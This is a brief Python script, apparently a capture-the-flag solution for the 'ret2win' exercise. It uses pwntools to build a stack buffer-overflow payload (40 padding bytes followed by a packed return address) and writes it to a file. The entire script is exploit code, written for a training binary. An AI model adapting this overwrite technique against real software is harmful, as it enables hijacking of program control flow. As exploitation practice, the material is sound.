#!/usr/bin/env python3

# Exploit script for ret2win

from pwn import *



payload = flat([
	b'A'*40,
	p64(0x400756)
	])

with open("input.txt", "wb") as f:
	f.write(payload)